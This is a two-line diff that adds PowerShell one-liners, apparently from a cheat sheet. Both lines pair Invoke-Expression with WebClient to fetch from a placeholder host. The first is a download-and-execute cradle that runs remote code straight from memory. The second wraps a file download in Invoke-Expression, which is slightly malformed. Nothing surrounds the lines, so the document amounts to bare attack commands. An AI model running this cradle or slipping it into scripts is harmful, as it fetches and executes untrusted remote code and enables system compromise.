@@ -1,0 +1,2 @@
+iex(new-object net.webclient).downloadstring('http://IP/file')
+iex(new-object net.webclient).downloadfile('http://IP/file', 'C:\path\to\file')
